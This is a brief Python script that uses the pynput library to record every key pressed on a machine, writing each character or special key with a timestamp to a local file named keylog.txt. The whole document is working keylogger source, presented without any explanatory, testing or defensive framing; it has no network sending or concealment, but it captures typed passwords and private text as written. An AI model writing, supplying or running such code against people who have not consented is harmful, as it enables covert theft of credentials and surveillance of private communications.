from pynput.keyboard import Listener, Key
import logging

log_file = "keylog.txt"
logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    try:
        logging.info(key.char)
    except AttributeError:
        logging.info(str(key))

with Listener(on_press=on_press) as listener:
    listener.join()
